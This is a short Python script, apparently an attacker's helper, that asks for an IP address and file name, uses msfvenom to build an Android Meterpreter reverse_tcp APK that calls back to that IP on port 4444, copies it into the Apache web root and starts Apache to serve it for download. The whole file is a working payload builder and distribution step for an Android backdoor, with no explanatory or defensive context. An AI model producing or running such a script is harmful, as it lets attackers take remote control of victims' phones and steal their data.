import os
import socket
lhost = str(input("Enter ur Ip: "))
apkname = str(input("Enter ur File name: "))
##r = "rm -r /root/tools/testbug1.apk"
##os.system(r)
i = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 R > /root/tools/{apkname}.apk"
j = f"cp /root/tools/{apkname}.apk /var/www/html/"
k = "service apache2 start"
os.system(i)
os.system(j)
os.system(k)
